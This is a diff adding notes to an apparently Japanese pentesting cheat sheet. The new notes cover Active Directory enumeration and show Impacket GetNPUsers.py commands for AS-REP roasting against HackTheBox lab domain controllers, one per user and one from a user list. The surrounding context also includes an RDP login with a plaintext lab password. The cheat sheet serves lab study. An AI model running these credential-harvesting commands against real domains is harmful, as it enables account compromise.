@@ -24,6 +24,19 @@ xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
 `Name`プロパティが「ドメイン名」、`PdcRoleOwner`が「プライマリドメインコントローラ名」。
 
 
+#GetNPUsers.py
+
+```
+# specific user 
+┌──(kali㉿kali)-[~]
+└─$ GetNPUsers.py -no-pass -dc-ip 10.10.10.52 htb.local/mantis
+
+# Using user list
+┌──(kali㉿kali)-[~]
+└─$ GetNPUsers.py htb.local/ -no-pass -dc-ip 10.10.10.161 -usersfile users.txt 
+```
+
+
 # Users And Groups
 ## List Local Accounts
 ```net user ```
